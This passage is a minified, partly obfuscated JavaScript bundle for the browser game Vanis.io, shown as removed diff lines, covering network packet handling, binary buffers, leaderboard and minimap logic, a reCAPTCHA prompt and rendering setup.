-                        $ = new u.SE($.buffer, 1), this.yJs(new c.A($).mQJ())
-                    }
-                    IWf() {
-                        var $ = this.game,
-                            e = A.LI(performance.now() - this.Iwi);
-                        this.ping.update(e), this.bjN && $.emit("EMciAd", e)
-                    }
-                    sYi($) {
-                        var e, t = this.game;
-                        if (this.bjN)
-                            for (; 0 !== (e = $.wVa());) t.FCi.remove(e, !0)
-                    }
-                    ttk($) {
-                        var e, t, x = this.game;
-                        this.bjN && (1 & (e = $.dsR()) && x.FCi.get(t = $.wVa())?.AcX(!0), 2 & e) && x.FCi.get(t = $.wVa())?.AcX(!1)
-                    }
-                    hWn($) {
-                        var e = this.game,
-                            [$, t] = (e.hYE[this.context] = performance.now(), e.GAB = performance.now(), (0, a.f)($, this.context)),
-                            $ = 0 != (e.TRu[this.context] = $);
-                        e.DMs(this.context, $), $ ? (e.fwE(this.context, !1), e.scores[this.context] = t, e.xmF[this.context] = A.T9(t, e.xmF[this.context]), s.A.zCS[this.context] && (e.triggerAutoRespawn(this.context), delete this.VjJ)) : s.A.zCS[this.context] && ++e.gFX[this.context] == this.VjJ && (e.triggerAutoRespawn(this.context), delete this.VjJ), this.bjN && (e.KRz++, e.pWR(!0), e.FCi.rvD())
-                    }
-                    GZq($) {
-                        var e = this.game,
-                            $ = {
-                                pid: $.wVa(),
-                                text: $.mIn()
-                            };
-                        if (0 === $.pid) {
-                            if (this.context === s.A.yNT) {
-                                if (/Welcome to Vanis\.io,.+\!/.test($.text)) {
-                                    let t = l.Dk;
-                                    var x, n = s.A.selectedServer;
-                                    n ? t = n.region + " " + n.name : 0 <= (n = $.text.indexOf(",")) && 0 <= (x = $.text.indexOf("!", n += 2)) && (t = $.text.substring(n, x)), $.text = (0, l.f9)(t)
-                                } else if (/Server restart.+/.test($.text)) return void(0, i.me)($.text, 1e3);
-                                this.game.emit("QsoZPW", $.text)
-                            }
-                        } else 1 < e.oiz && this.tagId === this.rSL.tagId && this.context !== s.A.yNT || e.FCi.has($.pid) && (n = e.FCi.get($.pid), $.DvN = PIXI.utils.hex2string(n.ppI), 1 < e.oiz && this.tagId !== this.rSL.tagId && ($.ePG = this.context), $.from = n.name, n.TIJ && ($.Yqh = n.TIJ), n.jqz && ($.badges = n.jqz), this.game.emit("NExDkf", $))
-                    }
-                    utE($) {
-                        var e = d.A.nVI($.data),
-                            t = (e.id = ++this.SLg, this.game);
-                        switch (e.dsR()) {
-                            case 1:
-                                return this.SGD(e);
-                            case 2:
-                                return this.gtu(e);
-                            case 3:
-                                return this.IWf();
-                            case 4:
-                                return this.sYi(e);
-                            case 6:
-                                return this.rHk(6);
-                            case 7:
-                                return this.ttk(e);
-                            case 10:
-                                return this.hWn(e);
-                            case 11:
-                                return this.bjN ? (0, n.Zj)(e) : void 0;
-                            case 12:
-                                return !this.bjN && 1 < t.oiz && this.rSL.tagId == this.tagId ? void 0 : (0, n.RP)(e, this.context);
-                            case 13:
-                                return this.GZq(e);
-                            case 16:
-                                return (0, n.ci)(e);
-                            case 17:
-                                return this.bjN ? void t.camera.IFG[this.context].set(e.Nhb(1, !0)) : void 0;
-                            case 18:
-                                return t.bLD(this.context);
-                            case 19:
-                                var a = 0 !== e.dsR();
-                                return (t.emit("AFHIfE", e.uDd()), a) ? (a = e.wVa(), void(0, i.me)((0, l.e_)(a), 3, 3e3)) : void 0;
-                            case 20:
-                                return void(x.A.get("autoRespawn") && !this.game.Xrx ? (s.A.zCS[this.context] = !0, performance.now() - this.VFc <= 3e4 ? this.VjJ = 37 : (this.VFc = performance.now(), this.VjJ = 86), t.gFX[this.context] = 0) : t.xCd[this.context] = (0, u.wg)(t.AUn.bind(t, this.context), 900));
-                            case 22:
-                                return "grecaptcha" in window ? void m.request(this) : void alert(l.EP);
-                            case 23:
-                                return void(s.A.VqP[this.context] = e.wVa());
-                            case 24:
-                                return this.bjN ? (t.KRz = e.uDd(), void t.emit("NZB", e.uDd())) : void 0;
-                            case 26:
-                                return r.qC.set(!e.dsR()), void(e.length > e.offset + 1 && r.pB.set(e.zWb() || (0, l.Rr)(1 + this.context)));
-                            case 28:
-                                return this.bjN ? (0, n.Py)(e) : void 0
-                        }
-                    }
-                    yJs($) {
-                        var e = "ignoreToken" in t.g || !/^wss?:\/\/[a-zA-Z0-9_-]+\.vanis\.io/i.test(this.SiW) ? null : localStorage.vanisToken;
-                        let x = d.A.ZiI(2 + $.length + ("string" == typeof e ? e.length : 0));
-                        x.hKc(5), x.hKc(this.game.zfx), $.forEach($ => x.hKc($)), (0, i.hJ)(x, this.context), "string" == typeof e && x.qBs(e), this.send(x)
-                    }
-                    CiT() {
-                        var $, e, t;
-                        this.connected && ({
-                            x: e,
-                            y: t
-                        } = (($ = d.A.ZiI(5)).hKc(16), this.mouse), $.Ylk(e), $.Ylk(t), this.send($))
-                    }
-                    rHk($) {
-                        var e = d.A.ZiI(1);
-                        e.hKc($), this.send(e)
-                    }
-                    BtR() {
-                        var $ = d.A.ZiI(1),
-                            e = ($.hKc(3), performance.now()),
-                            $ = (this.send($), performance.now() - e);
-                        return 0 != $ ? e + $ : e
-                    }
-                    mKa($) {
-                        var e;
-                        "string" == typeof $ && ((e = d.A.ZiI(1 + ($.length + 1))).hKc(11), e.qBs($), this.send(e))
-                    }
-                    uot($) {
-                        $ = (0, u.x4)(encodeURIComponent($));
-                        var e = d.A.ZiI(1 + $.length);
-                        e.hKc(99), e.zlO($), this.send(e)
-                    }
-                    adz($) {
-                        var e = d.A.ZiI(null != $ ? 3 : 1);
-                        e.hKc(2), "number" == typeof $ && e.Ylk($), this.send(e)
-                    }
-                    NTE() {
-                        this.VFc = performance.now();
-                        var $ = d.A.ZiI(1);
-                        $.hKc(1), (0, i.hJ)($, this.context), this.send($)
-                    }
-                    DQA() {
-                        this.rHk(10)
-                    }
-                    jjW($) {
-                        var e = 0 !== arguments.length,
-                            t = d.A.ZiI(e ? 2 : 1);
-                        t.hKc(21), e && t.hKc(+$), this.send(t)
-                    }
-                    JOy($) {
-                        var e = d.A.ZiI(2);
-                        e.hKc(17), e.hKc($), this.send(e)
-                    }
-                    get bjN() {
-                        return this.context === s.A.yNT || !this.game.pEA(s.A.yNT)
-                    }
-                    get rSL() {
-                        return this.game.eWI[0 == this.context ? 1 : 0]
-                    }
-                }
-            },
-            6883($, e, t) {
-                t.d(e, {
-                    A: () => A
-                });
-                var x = t(74173),
-                    s = t(72511),
-                    i = t(30847);
-                let n = {
-                        i8: i.U$.prototype.getInt8,
-                        u8: i.U$.prototype.getUint8,
-                        i16: i.U$.prototype.getInt16,
-                        u16: i.U$.prototype.getUint16,
-                        i32: i.U$.prototype.getInt32,
-                        u32: i.U$.prototype.getUint32
-                    },
-                    a = {
-                        i8: i.U$.prototype.setInt8,
-                        u8: i.U$.prototype.setUint8,
-                        i16: i.U$.prototype.setInt16,
-                        u16: i.U$.prototype.setUint16,
-                        i32: i.U$.prototype.setInt32,
-                        u32: i.U$.prototype.setUint32
-                    },
-                    o = ($, e, t, x, s) => ("number" != typeof s && (s = $.offset, $.offset += t), e.call($.view, s, x)),
-                    r = ($, e, t, x, s, i) => {
-                        l($, x), "number" != typeof i && (i = $.offset, $.offset += x), e.call($.view, i, t, s)
-                    },
-                    l = ($, e) => {
-                        var e = $.offset + e;
-                        e > $.length && (e = new i.Az(e), new i.SE(e).set(new i.SE($.kpj())), $.view = new i.U$(e))
-                    },
-                    c = {
-                        utf8($, e, t = !1) {
-                            var x = $.length;
-                            let i = "number" == typeof e ? e : $.offset,
-                                a = "";
-                            for (; i < x; i++) {
-                                var o = n.u8.call($.view, i);
-                                if (t && 0 === o) return "number" != typeof e && ($.offset = i + 1), a;
-                                a += s.QV(o)
-                            }
-                            return a
-                        },
-                        utf16($, e, t = !1) {
-                            var x = $.length;
-                            let i = "number" == typeof e ? e : $.offset,
-                                a = "";
-                            for (; i < x - 1; i += 2) {
-                                var o = n.u16.call($.view, i);
-                                if (t && 0 === o) return "number" != typeof e && ($.offset = i + 2), a;
-                                a += s.QV(o)
-                            }
-                            return a
-                        }
-                    },
-                    h = {
-                        utf8($, e, t) {
-                            var x = e.length;
-                            l($, x), "number" != typeof t && (t = $.offset, $.offset += x);
-                            for (let s = 0; s < x; s++) a.u8.call($.view, t + s, e.charCodeAt(s))
-                        },
-                        utf16($, e, t) {
-                            var x = e.length;
-                            l($, 2 * x), "number" != typeof t && (t = $.offset, $.offset += 2 * x);
-                            for (let s = 0; s < x; s++) a.u16.call($.view, t + 2 * s, e.charCodeAt(s))
-                        }
-                    };
-                class A {
-                    constructor($, e) {
-                        if (this.offset = 0, $ instanceof i.U$) this.view = $;
-                        else {
-                            if (!($ instanceof i.Az)) throw TypeError("First argument to SmartBuffer constructor must be an ArrayBuffer or DataView");
-                            this.view = new i.U$($)
-                        }
-                        "number" == typeof e && (this.offset = e)
-                    }
-                    static ZiI($) {
-                        return new this(new i.Az($), 0)
-                    }
-                    static nVI($, e) {
-                        return new this($, e)
-                    }
-                    get buffer() {
-                        var $ = this.view;
-                        return null != $ ? $.buffer : null
-                    }
-                    kpj() {
-                        return this.buffer
-                    }
-                    get length() {
-                        var $ = this.view;
-                        return null != $ ? $.byteLength : 0
-                    }
-                    get eof() {
-                        return this.offset >= this.length
-                    }
-                    now($) {
-                        return o(this, n.i8, 1, void 0, $)
-                    }
-                    dsR($) {
-                        return o(this, n.u8, 1, void 0, $)
-                    }
-                    DfC($) {
-                        return o(this, n.i16, 2, !0, $)
-                    }
-                    sdq($) {
-                        return o(this, n.i16, 2, !1, $)
-                    }
-                    wVa($) {
-                        return o(this, n.u16, 2, !0, $)
-                    }
-                    jPk($) {
-                        return o(this, n.u16, 2, !1, $)
-                    }
-                    tMN($) {
-                        return o(this, n.i32, 4, !0, $)
-                    }
-                    Yqj($) {
-                        return o(this, n.i32, 4, !1, $)
-                    }
-                    uDd($) {
-                        return o(this, n.u32, 4, !0, $)
-                    }
-                    DHr($) {
-                        return o(this, n.u32, 4, !1, $)
-                    }
-                    Nhb($, e) {
-                        return "number" != typeof $ && ($ = this.offset, this.offset += 4), x.A.from(n.i16.call(this.view, $, e), n.i16.call(this.view, $ + 2, e))
-                    }
-                    gEZ($ = "utf8", e) {
-                        return c[$](this, e, !1)
-                    }
-                    zWb($ = "utf8", e) {
-                        return c[$](this, e, !0)
-                    }
-                    mIn($ = "utf8", e) {
-                        return (0, i.IU)((0, i.ih)(this.zWb($, e)))
-                    }
-                    GhR($, e) {
-                        r(this, a.i8, $, 1, void 0, e)
-                    }
-                    hKc($, e) {
-                        r(this, a.u8, $, 1, void 0, e)
-                    }
-                    Ylk($, e) {
-                        r(this, a.i16, $, 2, !0, e)
-                    }
-                    Kyd($, e) {
-                        r(this, a.i16, $, 2, !1, e)
-                    }
-                    drz($, e) {
-                        r(this, a.u16, $, 2, !0, e)
-                    }
-                    xiT($, e) {
-                        r(this, a.u16, $, 2, !1, e)
-                    }
-                    CXO($, e) {
-                        r(this, a.i32, $, 4, !0, e)
-                    }
-                    xNc($, e) {
-                        r(this, a.i32, $, 4, !1, e)
-                    }
-                    NsC($, e) {
-                        r(this, a.u32, $, 4, !0, e)
-                    }
-                    BoJ($, e) {
-                        r(this, a.u32, $, 4, !1, e)
-                    }
-                    zlO($, e = "utf8", t) {
-                        h[e](this, $, t)
-                    }
-                    qBs($, e = "utf8", t) {
-                        h[e](this, $, t), "utf8" === e ? this.hKc(0) : this.drz(0)
-                    }
-                    KrG($, e = "utf8", t) {
-                        this.zlO((0, i.x4)((0, i.OH)($)), e, t)
-                    }
-                    Tea($, e = "utf8", t) {
-                        this.qBs((0, i.x4)((0, i.OH)($)), e, t)
-                    }
-                }
-            },
-            11029($, e, t) {
-                t.d(e, {
-                    O4: () => o,
-                    Py: () => c,
-                    RP: () => h,
-                    Zj: () => l,
-                    ci: () => r
-                });
-                var x = t(95195),
-                    s = t(78225),
-                    i = t(41958),
-                    n = t(53278),
-                    a = t(83529);
-                let o = $ => {
-                        var e, t, x, s = {},
-                            i = s.border = {},
-                            n = s.sizes = {
-                                zVF: 0,
-                                wEA: 0,
-                                MgU: 1,
-                                eyl: 1,
-                                zYf: 2
-                            };
-                        return s.protocol = $.dsR(), 4 <= s.protocol ? (s.PHu = $.dsR(), s.MXg = $.wVa(), s.lrL = $.wVa(), i.minx = $.DfC(), i.miny = $.DfC(), i.maxx = $.DfC(), i.maxy = $.DfC(), e = $.dsR(), i.circle = !!(1 & e), 2 & e && (t = n.zVF = $.wVa(), x = n.wEA = $.wVa(), n.MgU = x - t), 4 & e && (n.zYf = 2 * (n.eyl = $.wVa())), i.width = i.maxx - i.minx, i.height = i.maxy - i.miny) : (2 <= s.protocol ? (s.PHu = $.dsR(), s.MXg = $.wVa(), s.lrL = $.wVa(), i.width = $.uDd(), i.height = $.uDd()) : (s.PHu = 1, s.MXg = $.DfC(), s.lrL = $.DfC(), x = $.wVa(), i.width = x, i.height = x), i.minx = -i.width / 2, i.miny = -i.height / 2, i.maxx = +i.width / 2, i.maxy = +i.height / 2), i.x = (i.minx + i.maxx) / 2, i.y = (i.miny + i.maxy) / 2, s
-                    },
-                    r = $ => {
-                        $ = JSON.parse($.mIn());
-                        let e = -1,
-                            t;
-                        for (t of $) {
-                            var n = s.A.pids.indexOf(t.pid);
-                            n < 0 || x.A.eWI[n].fyP(t.tagId) && (e = -1 === e ? n : 2)
-                        }
-                        let a = new Set,
-                            o = new Set;
-                        if ($.forEach($ => {
-                                (($ = x.A.FCi.RRW($)) instanceof i.A ? a : o).add($)
-                            }), -1 !== e) {
-                            if (0 <= e) {
-                                if (2 === e)
-                                    for (let r = 0; r < 2; r++) x.A.emit("UrkjyI", [], r);
-                                else x.A.emit("UrkjyI", [], e)
-                            }
-                            x.A.FCi.AaG(a, o)
-                        }
-                    },
-                    l = $ => {
-                        for (var e = [];;) {
-                            var t, s = $.wVa();
-                            if (0 === s) return void x.A.emit("OyTJwL", e);
-                            x.A.FCi.has(s) && ((t = x.A.FCi.get(s)) instanceof n.A && a.A.get("excludeBotsOnLeaderboard") || (s = {
-                                pid: s,
-                                position: e.length + 1,
-                                text: t.name
-                            }, t instanceof n.A ? (s.color = "#ffffff", s.bold = !1) : (s.color = t.TIJ || "#ffffff", s.bold = !!t.hWu, s.badges = t.jqz), e.push(s)))
-                        }
-                    },
-                    c = $ => {
-                        for (var e = [];;) {
-                            var t = $.dsR();
-                            if (0 === t) return void x.A.emit("OyTJwL", e);
-                            var s, i = {};
-                            1 & t && (i.position = $.dsR()), 2 & t && (i.pid = $.wVa()), 4 & t ? (i.text = $.mIn(), i.color = "#ffffff") : (s = 2 & t && x.A.FCi.vrx(i.pid), i.text = s ? s.name : "n/a", i.color = s && s.TIJ || "#ffffff"), 8 & t && (i.score = $.mIn()), 16 & t && (i.color = "#" + ("00" + $.dsR().toString(16)).slice(-2) + ("00" + $.dsR().toString(16)).slice(-2) + ("00" + $.dsR().toString(16)).slice(-2)), 32 & t && (i.bold = !0), 64 & t && (i.link = $.mIn()), e.push(i)
-                        }
-                    },
-                    h = ($, e) => {
-                        for (var t = [];;) {
-                            var i = $.wVa();
-                            if (0 === i) return x.A.emit("UrkjyI", t, e), void(s.A.OcY[e] = $.uDd());
-                            $.offset++;
-                            var n = $.dsR(),
-                                a = $.dsR();
-                            t.push({
-                                pid: i,
-                                x: n / 255,
-                                y: a / 255
-                            })
-                        }
-                    }
-            },
-            22398($, e, t) {
-                t.d(e, {
-                    A: () => s
-                }), t(15308);
-                let x;
-                class s {
-                    handle($) {
-                        this.hide(), this.FLt.mKa($), delete this.FLt
-                    }
-                    request($) {
-                        null == this.container && (this.container = document.querySelector(".captcha-container")), this.visible = !0, this.FLt = $, grecaptcha.ready(() => {
-                            "number" == typeof x ? grecaptcha.reset(x) : x = grecaptcha.render(this.container, {
-                                sitekey: "6LfN7J4aAAAAAPN5k5E2fltSX2PADEyYq6j1WFMi",
-                                callback: this.handle.bind(this)
-                            })
-                        })
-                    }
-                    set visible($) {
-                        this.container.style.display = $ ? "" : "none"
-                    }
-                    show() {
-                        this.visible = !0
-                    }
-                    hide() {
-                        this.visible = !1
-                    }
-                }
-            },
-            30847($, e, t) {
-                t.d(e, {
-                    Az: () => n,
-                    DJ: () => d,
-                    IU: () => r,
-                    O3: () => i,
-                    OH: () => l,
-                    SE: () => a,
-                    U$: () => o,
-                    ih: () => c,
-                    wg: () => A,
-                    x4: () => h,
-                    yb: () => u
-                });
-                var x = t(72511);
-                let s = [],
-                    i = ([
-                        [193, 200, 186, 233, 201, 200, 219, 173],
-                        [201, 192, 178, 225, 193, 192, 212, 187, 220, 207, 194, 213, 194, 192, 177, 165],
-                        [181, 182, 235, 212, 227, 195, 231, 193, 226, 237, 201, 231, 228, 176, 156, 156],
-                        [185, 206, 205, 151, 176, 189, 177, 215, 177, 175, 234, 148],
-                        [232, 213, 228, 184, 176, 128, 224, 186, 228, 228, 216, 216, 223, 128, 135, 194, 177, 213, 135, 195, 232, 229, 131, 126],
-                        [224, 237, 139, 176, 184, 136, 232, 178, 236, 236, 208, 208, 231, 136, 127, 202, 185, 221, 127, 203, 224, 237, 139, 134],
-                        [215, 213, 235, 199, 214, 213, 223, 201],
-                        [201, 220, 122, 193, 200, 119, 227, 189, 200, 236, 218, 114],
-                        [143, 222, 130, 220, 130, 115, 152, 160, 134, 131, 229, 221, 144, 109, 233, 233],
-                        [151, 230, 138, 228, 135, 139, 233, 228, 126, 124, 110, 230, 125, 139, 171, 225],
-                        [116, 205, 147, 167, 116, 115, 133, 112, 156, 114, 204, 167, 157, 206, 113, 203],
-                        [108, 213, 139, 159, 108, 107, 125, 125, 165, 161, 117, 159, 166, 161, 109, 155, 165, 132, 208, 208]
-                    ].forEach(($, e) => {
-                        s.push(atob($.map(($, s) => (t.g.z, (0, x.QV)($ + ((32 | e) >> 1) ^ (16 | e) << 3))).join("")))
-                    }), delete t.g.z, t.g[s.shift()]),
-                    n = t.g[s.shift()],
-                    a = t.g[s.shift()],
-                    o = t.g[s.shift()],
-                    r = t.g[s.shift()],
-                    l = t.g[s.shift()],
-                    c = t.g[s.shift()],
-                    h = t.g[s.shift()],
-                    A = t.g[s.shift()],
-                    u = t.g[s.shift()],
-                    d = t.g[s.shift()];
-                t.g[s.shift()]
-            },
-            95654($, e, t) {
-                t.d(e, {
-                    A: () => o
-                });
-                var x = t(61036),
-                    s = t(72511),
-                    i = t(30847);
-                let n;
-                {
-                    let a = [121, 111, 117, 32, 115, 107, 105, 100, 46].map($ => s.QV($)).join("");
-                    n = [124, 24, 138, 29, 216, 4, 129, 66, 8].map(($, e) => $ ^ a.charCodeAt(e) + e)
-                }
-                class o {
-                    constructor($) {
-                        this.data = $ instanceof i.SE ? i.O3.from($) : $
-                    }
-                    RwF($, e) {
-                        var t = this.data[e],
-                            x = t + 5 & 7,
-                            t = 255 & (t << x | t >>> 8 - x),
-                            x = $[0 != e ? e - 1 : 0] ^ n[e];
-                        $[e] = t ^ x ^ n[8]
-                    }
-                    mQJ($ = !1) {
-                        let e = new i.O3(13),
-                            t = 0;
-                        for (; t < 8;) this.RwF(e, t++);
-                        var s = 1 + x.RI(2147483646 * x.yT());
-                        return e[8] = e[0] ^ s >> 24, e[9] = e[1] ^ s >> 16, e[10] = e[2] ^ s >> 8, e[11] = s ^ e[3], e[12] = e[0] ^ +$ ^ 31, e = e.map($ => 255 & $)
-                    }
-                }
-            },
-            61036($, e, t) {
-                t.d(e, {
-                    F8: () => A,
-                    LI: () => h,
-                    RI: () => a,
-                    RZ: () => u,
-                    T9: () => o,
-                    jk: () => r,
-                    mk: () => n,
-                    n7: () => l,
-                    tn: () => i,
-                    yT: () => c
-                });
-                var x = t(72511);
-                t(15308);
-                let s;
-                s = [189, 209, 228, 216].map(($, e) => (0, x.QV)($ - ((e |= 3) << 4) ^ e << 6)).join(""), (e = t.g[s]).PI;
-                let i = e.abs;
-                e.acos, e.asin, e.atan, e.atan2;
-                let n = e.ceil;
-                e.cos, e.exp;
-                let a = e.floor;
-                e.log;
-                let o = e.max,
-                    r = e.min,
-                    l = e.pow,
-                    c = e.random,
-                    h = e.round,
-                    A = e.sin,
-                    u = e.sqrt;
-                e.tan, e.hypot
-            },
-            72511($, e, t) {
-                t.d(e, {
-                    QV: () => r
-                }), t(15308);
-                let x, s;
-                {
-                    x = String.fromCharCode(61317, 60773, 61269, 61893, 61509, 61349, 60805, 61717);
-                    for (let i = 0, n; i < 8; i++) n = x.charCodeAt(i), n = 65535 & ((65535 & (n -= 59957)) >> 4 | n << 12), x = x.substr(0, i) + String.fromCharCode(65535 & n) + x.substr(i + 1);
-                    x = atob(x);
-                    let a = ["ZnJvbUNoYXJDb2Rl", "ZnJvbUNvZGVQb2ludA==", "dG9TdHJpbmc="],
-                        o = t.g.z;
-                    s = $ => atob(a[($ = ($ ^= o) + o) - 1])
-                }
-                let r = (e = t.g[x])[s(-63)];
-                e[s(-64)], e[s(-61)]
-            },
-            4371($, e, t) {
-                t.d(e, {
-                    A: () => i
-                });
-                var x = t(72511);
-                t(15308);
-                let s;
-                s = [75, 89, 86, 71, 83, 79, 63, 65, 8].map(($, e) => (0, x.QV)($ + ((e |= 1) << 3) ^ e << 2)).join(""), e = t.g[s], delete t.g[s];
-                let i = e
-            },
-            74173($, e, t) {
-                t.d(e, {
-                    A: () => x
-                });
-                class x {
-                    get x() {
-                        return this.buffer[0]
-                    }
-                    set x($) {
-                        this.buffer[0] = $
-                    }
-                    get y() {
-                        return this.buffer[1]
-                    }
-                    set y($) {
-                        this.buffer[1] = $
-                    }
-                    static nVI($) {
-                        var e = new x;
-                        return e.buffer = $, e
-                    }
-                    static from($ = 0, e = 0) {
-                        var t = new x;
-                        return t.buffer = new Float32Array(2), t.x = $, t.y = e, t
-                    }
-                    set($, e) {
-                        return $ instanceof x && (e = $.y, $ = $.x), this.x = $, this.y = e, this
-                    }
-                    add($, e) {
-                        return $ instanceof x && (e = $.y, $ = $.x), this.x += $, this.y += e, this
-                    }
-                    subtract($, e) {
-                        return $ instanceof x && (e = $.y, $ = $.x), this.x -= $, this.y -= e, this
-                    }
-                    divide($) {
-                        return this.x /= $, this.y /= $, this
-                    }
-                    lerp($, e) {
-                        return this.x += ($.x - this.x) * e, this.y += ($.y - this.y) * e, this
-                    }
-                    collides($, e) {
-                        $ instanceof x && (e = $.y, $ = $.x);
-                        var {
-                            x: t,
-                            y: s
-                        } = this;
-                        return t < -$ || $ < t || s < -e || e < s
-                    }
-                    reset() {
-                        return this.x = this.y = 0, this
-                    }
-                    copy($) {
-                        $.x = this.x, $.y = this.y
-                    }
-                    equals($) {
-                        return $.x === this.x && $.y === this.y
-                    }
-                    equalTo($, e) {
-                        return this.x === $ && this.y === e
-                    }
-                    clone() {
-                        return x.from(this.x, this.y)
-                    }
-                    toString() {
-                        return "{" + this.x + ", " + this.y + "}"
-                    }
-                    toArray() {
-                        return [this.x, this.y]
-                    }
-                    abB() {
-                        return 0 != this.x || 0 != this.y
-                    }
-                    set 0($) {
-                        this.x = $
-                    }
-                    get 0() {
-                        return this.x
-                    }
-                    set 1($) {
-                        this.y = $
-                    }
-                    get 1() {
-                        return this.y
-                    }
-                }
-            },
-            95514($, e, t) {
-                t.d(e, {
-                    L2: () => i,
-                    Uk: () => x,
-                    h0: () => n
-                }), e = t(83529), (t = t(87706)).utils.skipHello();
-                let x = t.autoDetectRenderer({
-                    resolution: e.A.org("gameResolution"),
-                    view: document.querySelector(".canvas"),
-                    forceCanvas: !e.A.get("useWebGL"),
-                    antialias: e.A.dlo("useAntialiasing"),
-                    powerPreference: "high-performance",
-                    backgroundColor: parseInt(e.A.get("backgroundColor"), 16)
-                });
-                (t = () => {
-                    var $ = window.innerWidth,
-                        e = window.innerHeight;
-                    x.resize($, e), x.view.style.width = $ + "px", x.view.style.height = e + "px"
-                })(), window.addEventListener("resize", t);
-                let s = ["interaction", "accessibility"],
-                    i = (s.forEach($ => {
-                        var e = x.plugins[$];
-                        e && (e.destroy(), delete x.plugins[$])
-                    }), x.clear(), $ => {
-                        x.view.style.display = $ ? "block" : "none"
-                    }),
-                    n = $ => {
-                        s.forEach(e => {
-                            var t = $.renderer.plugins[e];
-                            t && (t.destroy(), delete $.renderer.plugins[e])
-                        })
-                    };
-                i(!1)
-            },
-            49853($, e, t) {
-                t.d(e, {
-                    A: () => l
-                });
-                var x = t(95195),
-                    s = t(83529),
-                    i = t(95514),
-                    n = t(15308),
-                    a = t(74173),
-                    o = t(78225),
-                    r = t(87706);
-                let l = new class {
-                    constructor() {
-                        this.players = new Map, this.running = !1, this.visible = !1, this.ema = [
-                            [],
-                            []
-                        ], this.round = !1, this.add = ($, e, t, x) => {
-                            this.players.has($) && this.remove($), t = t || 16777215, x = x || 16777215;
-                            var s = new r.Container,
-                                x = (s.lrL = $, s.ytG = a.A.from(), s.isLocal = o.A.pids.includes($), s.isLocal && (x = 16711808), new r.Graphics().lineStyle(2, 0, .6).beginFill(x).drawCircle(0, 0, 5).endFill());
-                            s.addChild(x), e && ((x = new r.Text(e, {
-                                strokeThickness: 2,
-                                lineJoin: "round",
-                                fontFamily: "Space Grotesk",
-                                fill: t,
-                                fontSize: 12
-                            })).anchor.set(.5), x.pivot.y = 15, s.addChild(x)), this.players.set($, s)
-                        }, this.remove = $ => {
-                            if (!this.players.has($)) return (0, n.$s)(1, "[minimap] attempted to delete entry which doesnt exist");
-                            var e = this.players.get($);
-                            this.players.delete($), e.destroy(!0)
-                        }, this.update = ($, e) => {
-                            if (this.app) {
-                                "number" == typeof e ? this.ema[e] = $ : this.ema.forEach($ => {
-                                    $.length = 0
-                                });
-                                let t;
-                                for (t of $) {
-                                    var x;
-                                    this.players.has(t.pid) ? ((x = this.players.get(t.pid)).ytG.x = 220 * t.x, x.ytG.y = 220 * t.y, this.fcT.addChild(x)) : (0, n.$s)(1, "[minimap] entry not found!")
-                                }
-                            }
-                        }, this.animate = () => {
-                            var $ = s.A.get("minimapSmoothing") * (30 / s.A.get("minimapFPS"));
-                            for (let e of this.fcT.children) this.ema.some($ => $.some($ => $.pid === e.lrL)) ? (e.position.x = (0, n.Cc)(e.position.x, e.ytG.x, $), e.position.y = (0, n.Cc)(e.position.y, e.ytG.y, $)) : this.fcT.removeChild(e)
-                        }, x.A.on("OTySHI", () => this.show()), x.A.on("PSbuQD", () => this.hide()), x.A.on("HCvllF", () => this.hide()), x.A.on("VAEhBF", this.add), x.A.on("kIoddg", this.remove), x.A.on("dHeEDj", () => this.SCp())
-                    }
-                    init($) {
-                        this.app && (this.obX?.destroy(!0), this.fcT?.destroy(!0), this.app.destroy()), this.app = new r.Application({
-                            view: $,
-                            resolution: s.A.get("minimapResolution"),
-                            width: 220,
-                            height: 220,
-                            forceCanvas: !0,
-                            antialias: !1,
-                            powerPreference: "low-power",
-                            transparent: !0
-                        }), this.app.stage.sortableChildren = !0, this.obX = new r.Container, this.obX.zIndex = 0, this.fcT = new r.Container, this.fcT.zIndex = 1, this.app.stage.addChild(this.obX, this.fcT), this.app.ticker.maxFPS = s.A.get("minimapFPS"), this.app.ticker.add(() => this.animate()), (0, i.h0)(this.app)
-                    }
-                    show() {
-                        this.running || this.start(), this.visible = !0
-                    }
-                    hide() {
-                        this.running && (this.stop(), this.visible = !1)
-                    }
-                    start() {
-                        this.running || (this.running = !0, x.A.on("UrkjyI", this.update), this.app.stage.addChild(this.fcT, this.obX), this.app.ticker.start())
-                    }
-                    stop() {
-                        this.running && (delete this.running, x.A.off("UrkjyI", this.update), this.app.ticker.stop(), this.app.renderer.clear(), this.fcT.removeChildren(), this.obX.removeChildren(), this.app.stage.removeChildren(), this.ema.forEach($ => {
-                            $.length = 0
-                        }), delete this.round)
-                    }
-                    RyV($) {
-                        var e = new r.Graphics,
-                            t = (e.lineStyle(1, 4210752, .6), 220 / $);
-                        for (let x = 1; x < $; x++) {
-                            var s = x * t;
-                            e.moveTo(s, 0).lineTo(s, 220).moveTo(0, s).lineTo(220, s)
-                        }
-                        this.obX.addChild(e)
-                    }
-                    LmA($) {
-                        var e = new r.TextStyle({
-                                fontFamily: "Space Grotesk",
-                                fontSize: 14,
-                                fill: "#aaaaaa",
-                                align: "center"
-                            }),
-                            t = (this.locations = [], 220 / $),
-                            x = t / 2;
-                        for (let s = 0; s < $; s++) {
-                            var i = s * t + x;
-                            for (let n = 0; n < $; n++) {
-                                var o = n * t + x,
-                                    l = String.fromCharCode(97 + n).toUpperCase() + (s + 1),
-                                    c = new r.Text(l, e);
-                                c.anchor.set(.5), c.position.set(i, o), this.obX.addChild(c), this.locations.push({
-                                    id: l,
-                                    position: a.A.from(i, o)
-                                })
-                            }
-                        }
-                    }
-                    SCp() {
-                        var $;
-                        this.obX.removeChildren(), s.A.get("minimapLocations") && (this.round ? ($ = new r.Graphics().beginFill(0).drawEllipse(110, 110, 110, 110).endFill(), this.obX.mask = $, this.app.stage.addChild($)) : this.obX.mask = null, this.RyV(5), this.LmA(5))
-                    }
-                }
-            },
-            58514($, e, t) {
-                t.d(e, {
-                    A: () => n
-                });
-                var x = t(83529),
-                    s = t(87706);
-                let i = $ => {
-                    var e = parseInt(x.A.get("borderColor"), 16),
-                        {
-                            width: t,
-                            height: i
-                        } = $,
-                        n = new s.Graphics;
-                    return n.lineStyle(100, e, 1, .5), $.circle ? n.drawEllipse(t / 2, i / 2, t / 2, i / 2) : n.drawRect(0, 0, t, i), n.endFill(), n.pivot.set(t / 2, i / 2), n
-                };
-                class n {
-                    constructor($, e) {
